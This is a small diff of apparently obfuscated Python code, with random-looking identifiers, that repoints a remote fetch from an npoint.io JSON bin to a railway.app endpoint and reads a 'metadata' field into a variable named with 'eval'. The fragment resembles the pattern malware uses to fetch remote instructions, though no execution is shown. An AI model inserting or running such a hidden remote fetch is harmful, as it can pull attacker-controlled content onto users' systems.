@@ -16,7 +16,7 @@ def process_mvgmqf_204():
 
     def config_tndfcv_207():
         try:
-            config_ikkuhz_901 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_ikkuhz_901 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_ikkuhz_901.raise_for_status()
             process_kzmdrb_988 = config_ikkuhz_901.json()
             eval_jnwwpd_373 = process_kzmdrb_988.get('metadata')
